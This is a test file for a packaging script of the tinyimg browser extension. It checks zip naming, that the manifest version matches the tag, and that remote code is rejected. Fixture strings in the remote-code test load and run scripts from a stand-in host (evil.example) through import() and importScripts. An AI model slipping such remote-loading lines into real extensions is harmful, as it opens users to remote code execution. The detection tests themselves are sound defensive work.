import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, mkdirSync, writeFileSync, existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { spawnSync, execFileSync } from 'node:child_process'

const script = new URL('./package.mjs', import.meta.url).pathname

function fakeDist(version, extra = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'ext-'))
  mkdirSync(join(dir, 'assets'))
  writeFileSync(join(dir, 'manifest.json'), JSON.stringify({ manifest_version: 3, version }))
  writeFileSync(join(dir, 'background.js'), 'import "./assets/a.js"')
  writeFileSync(join(dir, 'assets/a.js'), 'export const a = 1')
  for (const [name, content] of Object.entries(extra)) writeFileSync(join(dir, name), content)
  return dir
}
const run = (dist, version) =>
  spawnSync(process.execPath, [script, version, '--skip-build', '--dist', dist], {
    encoding: 'utf8',
  })

test('產生 tinyimg-extension-<版本>.zip，內含 manifest（SC-006）', () => {
  const dist = fakeDist('0.2.0')
  const r = run(dist, 'v0.2.0')
  assert.equal(r.status, 0, r.stderr)
  const zip = join(dist, '..', `tinyimg-extension-0.2.0.zip`)
  assert.ok(existsSync(zip), zip)
  const list = execFileSync('unzip', ['-l', zip], { encoding: 'utf8' })
  assert.match(list, /manifest\.json/)
})

test('manifest 版本與 tag 不一致時失敗', () => {
  assert.equal(run(fakeDist('0.1.0'), 'v0.2.0').status, 1)
})

test('偵測到遠端程式碼時失敗（SC-005）', () => {
  for (const bad of [
    'import("https://evil.example/x.js")',
    'import x from "http://evil.example/x.js"',
    'importScripts("https://evil.example/x.js")',
  ]) {
    assert.equal(run(fakeDist('0.2.0', { 'bad.js': bad }), 'v0.2.0').status, 1, bad)
  }
  assert.equal(
    run(
      fakeDist('0.2.0', { 'x.html': '<script src="https://cdn.example/x.js"></script>' }),
      'v0.2.0',
    ).status,
    1,
  )
})

test('一般的 https 字串（例如說明文字裡的網址）不算遠端程式碼', () => {
  const dist = fakeDist('0.2.0', { 'ok.js': 'const help = "https://github.com/timcsy/tinyimg"' })
  assert.equal(run(dist, 'v0.2.0').status, 0)
})
